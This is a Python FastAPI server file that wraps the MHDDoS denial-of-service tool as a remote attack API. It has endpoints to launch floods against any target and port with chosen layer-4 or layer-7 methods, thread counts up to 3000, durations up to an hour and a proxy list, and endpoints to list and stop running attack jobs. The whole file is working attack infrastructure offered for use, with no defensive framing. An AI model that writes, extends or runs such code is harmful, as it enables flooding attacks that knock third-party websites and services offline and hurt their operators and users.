# api_server.py
import asyncio
import os
import sys
import time
import uuid
import threading
from typing import Optional

from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel

from config import (
    API_KEY, MAX_CONC, L7_METHODS, L4_METHODS, CUSTOM_METHODS,
    MHDDOS_DIR, PROXY_FILE,
)
from custom_methods import get_custom, HAS_CURL_CFFI

DEFAULT_THREADS = 150
RPC = 128
ALL_METHODS = L7_METHODS + L4_METHODS + CUSTOM_METHODS

JOBS: dict[str, dict] = {}
LOCK = threading.Lock()

app = FastAPI(title="MHDDoS API", version="2.1")


class AttackRequest(BaseModel):
    method: str
    target: str
    port: int = 80
    duration: int = 60
    threads: Optional[int] = None


class StopRequest(BaseModel):
    job_id: str


def _check_key(key: str):
    if key != API_KEY:
        raise HTTPException(403, "invalid key")


def _count() -> int:
    with LOCK:
        return len(JOBS)


# ── MHDDoS wrapper (fix C3: cwd มาจาก config) ──
def build_cmd(method, target, port, duration, threads):
    if method in L7_METHODS:
        url = target if target.startswith("http") else f"http://{target}"
        if port and ":" not in url.split("//")[-1]:
            url = f"{url}:{port}"
        return [sys.executable, "start.py", method, url, "5",
                str(threads), PROXY_FILE, str(RPC), str(duration)]
    host = target.split("//")[-1].split("/")[0].split(":")[0]
    return [sys.executable, "start.py", method,
            f"{host}:{port}", str(threads), str(duration)]


async def run_mhddos(job_id, method, target, port, duration, threads):
    cmd = build_cmd(method, target, port, duration, threads)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, cwd=MHDDOS_DIR,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
    except Exception as e:
        print(f"[JOB {job_id}] spawn fail: {e}")
        with LOCK:
            JOBS.pop(job_id, None)
        return
    with LOCK:
        if job_id in JOBS:
            JOBS[job_id]["proc"] = proc
    await proc.wait()
    with LOCK:
        JOBS.pop(job_id, None)


async def run_custom(job_id, method, target, port, duration, threads):
    stats = {"hits": 0, "errors": 0}
    host = target.split("//")[-1].split("/")[0].split(":")[0]

    cls = get_custom(method)
    if not cls:
        with LOCK:
            JOBS.pop(job_id, None)
        return

    worker = cls(host, port, duration, threads, stats)
    with LOCK:
        if job_id in JOBS:
            JOBS[job_id]["worker"] = worker

    try:
        await worker.run()
    except Exception as e:
        print(f"[JOB {job_id}] custom error: {e}")
    finally:
        with LOCK:
            JOBS.pop(job_id, None)


@app.get("/")
def root():
    return {"name": "MHDDoS API", "version": "2.1",
            "active": _count(), "max": MAX_CONC,
            "curl_cffi": HAS_CURL_CFFI,
            "mhddos_dir": MHDDOS_DIR}


@app.get("/methods")
def methods():
    return {"l7": L7_METHODS, "l4": L4_METHODS, "custom": CUSTOM_METHODS,
            "total": len(ALL_METHODS)}


@app.get("/status")
def status():
    with LOCK:
        jobs = [{"job_id": k, "method": v["method"], "target": v["target"],
                 "elapsed": int(time.time() - v["started"])}
                for k, v in JOBS.items()]
    return {"active": len(jobs), "max": MAX_CONC, "jobs": jobs}


@app.post("/attack")
async def attack(req: AttackRequest, key: str = Query("")):
    _check_key(key)
    method = req.method.upper()
    if method not in ALL_METHODS:
        raise HTTPException(400, f"unknown method: {method}")
    if _count() >= MAX_CONC:
        raise HTTPException(429, f"max concurrent {MAX_CONC}")
    if not (1 <= req.duration <= 3600):
        raise HTTPException(400, "duration must be 1-3600")

    threads = req.threads or DEFAULT_THREADS
    if not (10 <= threads <= 3000):
        raise HTTPException(400, "threads must be 10-3000")

    job_id = uuid.uuid4().hex[:12]
    with LOCK:
        JOBS[job_id] = {
            "job_id": job_id, "method": method, "target": req.target,
            "port": req.port, "duration": req.duration, "threads": threads,
            "started": time.time(), "proc": None, "worker": None,
        }

    if method in CUSTOM_METHODS:
        asyncio.create_task(run_custom(
            job_id, method, req.target, req.port, req.duration, threads))
    else:
        asyncio.create_task(run_mhddos(
            job_id, method, req.target, req.port, req.duration, threads))

    return {"success": True, "status": "Attack Sent",
            "job_id": job_id, "method": method, "target": req.target,
            "port": req.port, "duration": req.duration,
            "threads": threads, "active": _count()}


@app.post("/stop")
def stop(req: StopRequest, key: str = Query("")):
    _check_key(key)
    with LOCK:
        job = JOBS.pop(req.job_id, None)
    if not job:
        raise HTTPException(404, "job not found")
    proc = job.get("proc")
    if proc and proc.returncode is None:
        try:
            proc.terminate()
        except Exception:
            pass
    worker = job.get("worker")
    if worker:
        try:
            worker.stop()
        except Exception:
            pass
    return {"success": True, "job_id": req.job_id}


@app.post("/stop-all")
def stop_all(key: str = Query("")):
    _check_key(key)
    with LOCK:
        jobs = list(JOBS.values())
        JOBS.clear()
    for job in jobs:
        proc = job.get("proc")
        if proc and proc.returncode is None:
            try:
                proc.terminate()
            except Exception:
                pass
        worker = job.get("worker")
        if worker:
            try:
                worker.stop()
            except Exception:
                pass
    return {"success": True, "stopped": len(jobs)}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")